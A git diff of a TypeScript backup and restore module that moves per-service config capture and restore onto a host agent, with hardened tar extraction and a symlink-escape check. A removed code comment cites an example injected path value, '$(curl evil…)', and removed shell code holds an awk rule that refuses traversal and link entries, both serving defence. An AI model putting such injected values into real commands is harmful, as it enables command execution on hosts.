@@ -18,6 +18,7 @@ import { listNodes, PodmanConnection } from './nodes';
 import { SSHConnectionPool } from './ssh/pool';
 import { getConfig, updateConfig } from './config';
 import { shellQuote } from './util/shellQuote';
+import type { Executor } from './executor';
 
 const execFileAsync = promisify(execFile);
 const BACKUP_PREFIX = 'servicebay-full';
@@ -155,9 +156,16 @@ interface BackupNodeDescriptor {
 }
 
 interface ServiceDataEntry {
+    /** The on-disk subdir under `service-config/` in the archive — the manifest
+     *  `service` name (e.g. `home-assistant`, `nginx`). Kept named `label` for
+     *  metadata back-compat with v2 backups. */
     label: string;
+    /** Resolved service data dir the config was read from / restores back to. */
     sourcePath: string;
     nodeName: string;
+    /** Manifest `service` name — resolves the restore target dir per node via
+     *  the per-service producer. Absent on legacy (proxy hostPath) backups. */
+    service?: string;
 }
 
 interface BackupMetadata {
@@ -377,6 +385,55 @@ export async function safeTarExtract(
     }
 }
 
+/**
+ * Extract a per-service config tar into `destDir` on a target node's HOST
+ * filesystem via the node agent (#1597/#1600). The services' data dirs
+ * (`/mnt/data/stacks/<svc>`) are NOT bind-mounted into the servicebay
+ * container, so the box restore must go through the agent — mirroring the
+ * unified restore engine's `agentRestoreBackend`. The traversal/link pre-pass
+ * runs in-container on the tar bytes (the primary defence), then the tar is
+ * pushed host-side (base64 over the agent's utf-8-only write) and extracted
+ * with the same hardening flags `safeTarExtract` uses, followed by a host-side
+ * symlink-escape walk.
+ */
+export async function extractServiceConfigToNode(executor: Executor, tar: Buffer, destDir: string): Promise<void> {
+    // In-container traversal/link refusal on the raw tar bytes before anything
+    // touches the host.
+    const tmp = path.join(os.tmpdir(), `sb-svcconfig-${Date.now()}-${process.pid}.tar`);
+    try {
+        await fs.writeFile(tmp, tar);
+        await assertSafeArchiveEntries(tmp, false);
+    } finally {
+        await fs.rm(tmp, { force: true });
+    }
+    const { stdout } = await executor.execArgv(['mktemp', '-t', 'sb-svcconfig-XXXXXX']);
+    const hostTar = stdout.trim();
+    const hostTarB64 = `${hostTar}.b64`;
+    try {
+        await executor.writeFile(hostTarB64, tar.toString('base64'));
+        await executor.execArgv(['sh', '-c', 'base64 -d "$1" > "$2"', 'sh', hostTarB64, hostTar], { timeoutMs: 120_000 });
+        await executor.execArgv(['mkdir', '-p', destDir]);
+        await executor.execArgv(
+            ['tar', '-xf', hostTar, '-C', destDir, '--no-same-owner', '--no-overwrite-dir', '--no-same-permissions'],
+            { timeoutMs: 120_000 },
+        );
+        // Host-side symlink-escape walk (defense in depth): refuse any symlink
+        // that resolves outside destDir, cleaning up on refusal.
+        const realRoot = (await executor.execArgv(['readlink', '-f', destDir])).stdout.trim();
+        const links = (await executor.execArgv(['find', destDir, '-type', 'l'])).stdout
+            .split('\n').map(l => l.trim()).filter(Boolean);
+        for (const link of links) {
+            const resolved = (await executor.execArgv(['readlink', '-f', link]).catch(() => ({ stdout: '' }))).stdout.trim();
+            if (!resolved || (resolved !== realRoot && !resolved.startsWith(realRoot + '/'))) {
+                await executor.execArgv(['rm', '-rf', destDir]).catch(() => {});
+                throw new Error(`Refused archive: symlink "${link}" → "${resolved}" escapes the extraction directory`);
+            }
+        }
+    } finally {
+        await executor.execArgv(['rm', '-f', hostTarB64, hostTar]).catch(() => {});
+    }
+}
+
 function pushLog(logs: BackupLogEntry[], progress: ProgressCallback | undefined, entry: Omit<BackupLogEntry, 'timestamp'>) {
     const payload: BackupLogEntry = {
         ...entry,
@@ -384,6 +441,85 @@ function pushLog(logs: BackupLogEntry[], progress: ProgressCallback | undefined,
     };
     logs.push(payload);
     progress?.(payload);
+}
+
+/**
+ * Stage every installed service's CONFIG (not bulk DATA) into the archive's
+ * `service-config/<svc>/` tree, reusing the per-service producer so the bytes
+ * are identical to the NAS atom (epic #1607/#1608 — the same include/exclude/
+ * glob/strip/transform/collector spec, run host-side via the node agent).
+ *
+ * Replaces the old nginx-only `isProxy` hostPath loop: nginx is now just another
+ * manifest atom. Returns true if at least one service contributed config.
+ *
+ * Services run on the box ServiceBay itself manages (the Local node), and
+ * `installedTemplates` is global config; we resolve each service's data dir and
+ * read it through the host agent (#1597), the same path install/restore/deploy
+ * use. Per-service failures are logged and skipped — one bad service doesn't
+ * abort the snapshot.
+ */
+export async function stageServiceConfig(
+    stagingDir: string,
+    metadata: BackupMetadata,
+    logs: BackupLogEntry[],
+    progress: ProgressCallback | undefined,
+): Promise<boolean> {
+    const serviceConfigRoot = path.join(stagingDir, 'service-config');
+    metadata.serviceData = [];
+
+    const { SERVICE_BACKUP_MANIFESTS, getBackupGate } = await import('./externalBackup/serviceManifest');
+    const { buildServiceBackupTar, agentFileBackend, resolveServiceDataDir, runBackupCollector } = await import('./externalBackup/producer');
+    const { getExecutor } = await import('./executor');
+
+    const installed = new Set(Object.keys((await getConfig()).installedTemplates ?? {}));
+    const nodeName = 'Local';
+    const backend = agentFileBackend(getExecutor(nodeName));
+    let stagedAny = false;
+
+    for (const manifest of SERVICE_BACKUP_MANIFESTS) {
+        // Sibling-store entries (#1594) gate on their parent template, not their
+        // own synthetic service name.
+        if (!installed.has(getBackupGate(manifest))) continue;
+        const svc = manifest.service;
+        try {
+            const serviceDataDir = await resolveServiceDataDir(svc);
+            // The producer runs any in-container collector (NPM's consistent
+            // sqlite snapshot) itself when given an agent backend + node — but
+            // buildServiceBackupTar takes a resolved manifest, so we mirror
+            // backupServiceToNas's collector step.
+            const effective = manifest.collector
+                ? await runBackupCollector(manifest, nodeName)
+                : manifest;
+            const tar = await buildServiceBackupTar(serviceDataDir, effective, backend);
+
+            const destDir = path.join(serviceConfigRoot, svc);
+            await fs.mkdir(destDir, { recursive: true });
+            const tmpTar = path.join(serviceConfigRoot, `${svc}.tar`);
+            await fs.writeFile(tmpTar, tar);
+            // The producer builds a SAFE-by-construction plain tar from a staging
+            // dir it controls; safeTarExtract (gzip:false) still applies the
+            // standard restore-side hardening as belt-and-suspenders.
+            await safeTarExtract(tmpTar, destDir, { gzip: false });
+            await fs.rm(tmpTar, { force: true });
+
+            (metadata.serviceData as ServiceDataEntry[]).push({
+                label: svc,
+                service: svc,
+                sourcePath: serviceDataDir,
+                nodeName,
+            });
+            stagedAny = true;
+            pushLog(logs, progress, { scope: 'local', status: 'success', node: nodeName, message: `Captured config for ${svc}` });
+        } catch (error) {
+            const message = error instanceof Error ? error.message : String(error);
+            // "No config files to back up" just means the service has no
+            // on-disk config yet — a skip, not an error.
+            const status: BackupLogStatus = /No config files to back up/.test(message) ? 'skip' : 'error';
+            pushLog(logs, progress, { scope: 'local', status, node: nodeName, message: `${svc}: ${message}` });
+        }
+    }
+
+    return stagedAny;
 }
 
 async function copyFileIfExists(source: string, destination: string): Promise<boolean> {
@@ -744,117 +880,17 @@ export async function createSystemBackup(progress?: ProgressCallback): Promise<S
             }
         }
 
-        // Stage reverse-proxy bind mounts (nginx config, SSL, etc.) from Digital Twin
-        const serviceDataDir = path.join(stagingDir, 'service-data');
-        metadata.serviceData = [];
-
-        const { getNodeTwin, getProxyState } = await import('./store/repository');
-        const { default: yamlLib } = await import('js-yaml');
-        const allNodes = await listNodes();
-        const sshNodes = allNodes.filter(node => node.URI?.startsWith('ssh://'));
-
-        for (const node of sshNodes) {
-            const twin = getNodeTwin(node.Name);
-            if (!twin) continue;
-
-            // Parse hostPath volumes from reverse-proxy YAML files in twin.files
-            const proxyMounts: { source: string; label: string }[] = [];
-            const proxyState = getProxyState();
-
-            for (const [filePath, file] of Object.entries(twin.files || {})) {
-                if (!filePath.endsWith('.yml') && !filePath.endsWith('.yaml')) continue;
-                if (!file.content) continue;
-
-                try {
-                    const docs = yamlLib.loadAll(file.content) as Record<string, unknown>[];
-                    for (const doc of docs) {
-                        if (!doc?.spec) continue;
-                        const spec = doc.spec as Record<string, unknown>;
-                        const metadata = doc.metadata as Record<string, unknown> | undefined;
-                        const labels = (metadata?.labels || {}) as Record<string, string>;
-                        const podName = (metadata?.name || '') as string;
-
-                        // Check if this is a reverse-proxy pod
-                        const isProxy = labels['servicebay.role'] === 'reverse-proxy'
-                            || /nginx|proxy/i.test(podName)
-                            || (proxyState?.provider === 'nginx' && /nginx/i.test(podName));
-                        if (!isProxy) continue;
-
-                        // Extract hostPath volumes
-                        const volumes = (spec.volumes || []) as Array<Record<string, unknown>>;
-                        const containers = (spec.containers || []) as Array<Record<string, unknown>>;
-                        const mountMap = new Map<string, string>();
-                        for (const ct of containers) {
-                            for (const vm of (ct.volumeMounts || []) as Array<Record<string, string>>) {
-                                if (vm.name && vm.mountPath) mountMap.set(vm.name, vm.mountPath);
-                            }
-                        }
-
-                        for (const vol of volumes) {
-                            const hp = vol.hostPath as Record<string, string> | undefined;
-                            if (!hp?.path) continue;
-                            const volName = vol.name as string;
-                            const containerDest = mountMap.get(volName) || volName;
-                            const label = containerDest.replace(/^\//, '').replace(/\//g, '-');
-                            proxyMounts.push({ source: hp.path, label });
-                        }
-                    }
-                } catch {
-                    // skip unparseable files
-                }
-            }
-
-            if (proxyMounts.length === 0) {
-                pushLog(logs, progress, { scope: 'remote', status: 'skip', node: node.Name, message: 'No reverse-proxy hostPath volumes found in YAML files' });
-                continue;
-            }
-
-            pushLog(logs, progress, { scope: 'remote', status: 'info', node: node.Name, message: `Found ${proxyMounts.length} proxy volume(s): ${proxyMounts.map(m => m.source).join(', ')}` });
-
-            const conn = await SSHConnectionPool.getInstance().getConnection(node.Name);
-            for (const mount of proxyMounts) {
-                // mount.source comes from parsed Quadlet YAML on the remote
-                // node. shellQuote it before any shell-template insertion —
-                // a Volume= entry with shell-metas would otherwise inject.
-                const quotedSource = shellQuote(mount.source);
-                const checkResult = await execRemoteCommand(conn, `test -d ${quotedSource} && ls -A ${quotedSource} 2>/dev/null | head -1`);
-                if (checkResult.code !== 0 || !checkResult.stdout.trim()) {
-                    pushLog(logs, progress, { scope: 'remote', status: 'skip', node: node.Name, message: `${mount.source} is empty` });
-                    continue;
-                }
-
-                const dirName = mount.label;
-                const localDir = path.join(serviceDataDir, dirName);
-                await fs.mkdir(localDir, { recursive: true });
-
-                const tmpArchive = path.join(localDir, 'data.tgz');
-                const script = [
-                    'set -e',
-                    `tmpfile=$(mktemp /tmp/servicebay-svcdata-XXXXXX.tar.gz)`,
-                    `tar -czf "$tmpfile" -C ${quotedSource} .`,
-                    `echo "$tmpfile"`
-                ].join('\n');
-                const archiveResult = await execRemoteCommand(conn, script);
-                if (archiveResult.code !== 0) continue;
-                const remoteTmp = archiveResult.stdout.trim().split('\n').pop();
-                if (!remoteTmp) continue;
-
-                await downloadRemoteFile(conn, remoteTmp, tmpArchive);
-                await execRemoteCommand(conn, `rm -f ${shellQuote(remoteTmp)}`);
-                await safeTarExtract(tmpArchive, localDir);
-                await fs.rm(tmpArchive, { force: true });
-
-                const existing = (metadata.serviceData as ServiceDataEntry[]).find(e => e.label === dirName);
-                if (!existing) {
-                    (metadata.serviceData as ServiceDataEntry[]).push({
-                        label: dirName,
-                        sourcePath: mount.source,
-                        nodeName: node.Name
-                    });
-                }
-                stagedSomething = true;
-                pushLog(logs, progress, { scope: 'remote', status: 'success', node: node.Name, message: `Captured ${mount.source} (${dirName})` });
-            }
+        // Stage per-service CONFIG (not bulk data) from every installed service
+        // that has a backup manifest — HA `.storage`/automations/zwave keys,
+        // adguard, authelia, syncthing, hermes, and nginx (just another atom).
+        // This reuses the per-service producer (`stageServiceBackup` via the
+        // host-agent backend, #1597) so the Snapshot's service-config section is
+        // byte-identical to the NAS atom (epic invariant #1607/#1608). It
+        // retires the old nginx-only `isProxy` hostPath loop. Bulk DATA-class
+        // paths (Immich library, recorder DB, vectordb, zwave mesh db) stay
+        // excluded — those are Backup Sync's job.
+        if (await stageServiceConfig(stagingDir, metadata, logs, progress)) {
+            stagedSomething = true;
         }
 
         if (!stagedSomething) {
@@ -1001,20 +1037,25 @@ export async function previewSystemBackup(archivePath: string): Promise<BackupPr
             }
         }
 
-        // Preview service-data (nginx config etc.)
-        const serviceDataDir = path.join(stagingDir, 'service-data');
+        // Preview per-service config (HA `.storage`/automations/zwave keys,
+        // adguard, authelia, syncthing, hermes, nginx). Falls back to the legacy
+        // `service-data/` dir name so a v2 backup still previews.
+        let serviceConfigDir = path.join(stagingDir, 'service-config');
+        if (!(await pathExists(serviceConfigDir))) {
+            serviceConfigDir = path.join(stagingDir, 'service-data');
+        }
         const serviceData: BackupPreviewServiceData[] = [];
-        if (await pathExists(serviceDataDir)) {
+        if (await pathExists(serviceConfigDir)) {
             const backupMeta = await readMetadata(stagingDir);
             const sdEntries = backupMeta?.serviceData;
             const sdMeta = (sdEntries && sdEntries.length > 0 && typeof sdEntries[0] === 'object')
                 ? sdEntries as ServiceDataEntry[]
                 : undefined;
 
-            const dataDirs = await fs.readdir(serviceDataDir, { withFileTypes: true });
+            const dataDirs = await fs.readdir(serviceConfigDir, { withFileTypes: true });
             for (const dirent of dataDirs) {
                 if (!dirent.isDirectory()) continue;
-                const dirPath = path.join(serviceDataDir, dirent.name);
+                const dirPath = path.join(serviceConfigDir, dirent.name);
                 const files = await listFilesRecursive(dirPath);
                 const metaEntry = sdMeta?.find(e => e.label === dirent.name);
                 serviceData.push({
@@ -1184,11 +1225,19 @@ export async function restoreSystemBackupSelection(archivePath: string, selectio
             }
         }
 
-        // Restore service-data (nginx config etc.) to original host paths
+        // Restore per-service config to each service's resolved data dir. The
+        // staged layout is `service-config/<svc>/` (legacy backups: `service-data/`),
+        // and the per-service producer's manifest defines the target dir, so the
+        // restore writes config back where the live service reads it (#1597) via
+        // the host agent — the same hardened path the unified restore engine uses.
         if (selection.serviceData?.length) {
             const backupMetadata = await readMetadata(stagingDir);
-            const serviceDataDir = path.join(stagingDir, 'service-data');
-            const sshNodes2 = (await listNodes()).filter(n => n.URI?.startsWith('ssh://'));
+            let serviceConfigDir = path.join(stagingDir, 'service-config');
+            if (!(await pathExists(serviceConfigDir))) {
+                serviceConfigDir = path.join(stagingDir, 'service-data');
+            }
+            const { resolveServiceDataDir } = await import('./externalBackup/producer');
+            const { getExecutor } = await import('./executor');
 
             // Normalize selection: support both string[] (all files) and ServiceDataSelection[]
             const normalizedSelections: ServiceDataSelection[] = selection.serviceData.map(item =>
@@ -1197,32 +1246,35 @@ export async function restoreSystemBackupSelection(archivePath: string, selectio
 
             for (const sdSelection of normalizedSelections) {
                 const dirName = sdSelection.name;
-                const localDir = path.join(serviceDataDir, dirName);
+                const localDir = path.join(serviceConfigDir, dirName);
                 if (!(await pathExists(localDir))) continue;
 
-                // Resolve target path from metadata (v2+) or fall back to current twin mounts
-                let remotePath: string | undefined;
-                let targetNodeName: string | undefined;
+                // Resolve the target data dir + node from metadata (manifest-driven
+                // v2+), falling back to re-resolving the service's data dir.
+                let targetPath: string | undefined;
+                let targetNodeName = 'Local';
+                let serviceName = dirName;
 
                 const sdEntries = backupMetadata?.serviceData;
                 if (sdEntries && sdEntries.length > 0 && typeof sdEntries[0] === 'object') {
                     const entry = (sdEntries as ServiceDataEntry[]).find(e => e.label === dirName);
                     if (entry) {
-                        remotePath = entry.sourcePath;
-                        targetNodeName = entry.nodeName;
+                        targetPath = entry.sourcePath;
+                        targetNodeName = entry.nodeName || 'Local';
+                        serviceName = entry.service || dirName;
+                    }
+                }
+                if (!targetPath) {
+                    // No metadata (legacy/missing) — re-resolve from the manifest.
+                    try {
+                        targetPath = await resolveServiceDataDir(serviceName);
+                    } catch {
+                        logger.warn('SystemBackup', `No target path for service-config "${dirName}", skipping`);
+                        continue;
                     }
                 }
 
-                const targetNodes = targetNodeName
-                    ? sshNodes2.filter(n => n.Name === targetNodeName)
-                    : sshNodes2;
-
-                if (!remotePath) {
-                    logger.warn('SystemBackup', `No source path found for service-data "${dirName}", skipping`);
-                    continue;
-                }
-
-                // If specific files requested, create a filtered staging directory
+                // If specific files requested, create a filtered staging directory.
                 let archiveSourceDir = localDir;
                 let filteredDir: string | undefined;
                 if (sdSelection.files && sdSelection.files.length > 0) {
@@ -1240,47 +1292,19 @@ export async function restoreSystemBackupSelection(archivePath: string, selectio
                 }
 
                 try {
-                    for (const node of targetNodes) {
-                        const conn = await SSHConnectionPool.getInstance().getConnection(node.Name);
-                        const tmpArchive = path.join(os.tmpdir(), `servicebay-svcdata-${Date.now()}.tar.gz`);
-                        await runTar(['-czf', tmpArchive, '-C', archiveSourceDir, '.']);
-                        const mktemp = await execRemoteCommand(conn, 'mktemp /tmp/servicebay-svcdata-XXXXXX.tar.gz');
-                        if (mktemp.code !== 0) {
-                            await fs.rm(tmpArchive, { force: true });
-                            continue;
-                        }
-                        const remoteTmp = mktemp.stdout.trim();
-                        await uploadRemoteFile(conn, tmpArchive, remoteTmp);
+                    // Tar the staged config (plain tar — the producer's atom format)
+                    // and extract it host-side via the node agent with the same
+                    // hardened guards (#580/#590) the restore engine applies.
+                    const tmpArchive = path.join(os.tmpdir(), `servicebay-svcconfig-${Date.now()}.tar`);
+                    try {
+                        await runTar(['-cf', tmpArchive, '-C', archiveSourceDir, '.']);
+                        const tarBytes = await fs.readFile(tmpArchive);
+                        await extractServiceConfigToNode(getExecutor(targetNodeName), tarBytes, targetPath);
+                    } finally {
                         await fs.rm(tmpArchive, { force: true });
-                        // Same SSH-side hardening as restoreRemoteSystemd (#580):
-                        // refuse abs/traversal entries first, then extract
-                        // with no-overwrite-dir + no-absolute-names + no-
-                        // same-owner. Service-data restores are the
-                        // highest-risk extract path because they unpack into
-                        // operator-controlled `remotePath` mounts.
-                        // Same SSH-side guard as restoreRemoteSystemd
-                        // (#580 + #590): refuse links, abs paths, traversal.
-                        // remotePath comes from the backup metadata (entry.sourcePath)
-                        // and is user-controlled at restore time — a malicious backup
-                        // could carry a sourcePath like `"$(curl evil…)"` which would
-                        // execute via command substitution even inside double quotes.
-                        // shellQuote forces it through single-quotes (no expansion at all).
-                        const remoteSvcScript = [
-                            'set -e',
-                            `tmp=${shellQuote(remoteTmp)}`,
-                            `target=${shellQuote(remotePath)}`,
-                            `tar -tvzf "$tmp" | awk '/^[lh]/ { print "Refused archive: contains link entry: " $NF > "/dev/stderr"; exit 2 } { for (i=6; i<=NF; i++) name = (i==6 ? $i : name " " $i); if (name ~ /^\\// || name ~ /(^|\\/)\\.\\.($|\\/)/) { print "Refused archive: contains abs/traversal entry: " name > "/dev/stderr"; exit 2 } }'`,
-                            'mkdir -p "$target"',
-                            'tar -xzf "$tmp" -C "$target" --no-same-owner --no-overwrite-dir --no-same-permissions',
-                            'rm -f "$tmp"',
-                        ].join('\n');
-                        const svcExtract = await execRemoteCommand(conn, remoteSvcScript);
-                        if (svcExtract.code !== 0) {
-                            throw new Error(svcExtract.stderr || `Failed to restore ${dirName} on ${node.Name}`);
-                        }
-                        const fileDesc = sdSelection.files ? `${sdSelection.files.length} files from ${dirName}` : dirName;
-                        logger.info('SystemBackup', `Restored ${fileDesc} to ${node.Name}:${remotePath}`);
                     }
+                    const fileDesc = sdSelection.files ? `${sdSelection.files.length} files from ${dirName}` : dirName;
+                    logger.info('SystemBackup', `Restored ${fileDesc} to ${targetNodeName}:${targetPath}`);
                 } finally {
                     if (filteredDir) await fs.rm(filteredDir, { recursive: true, force: true });
                 }
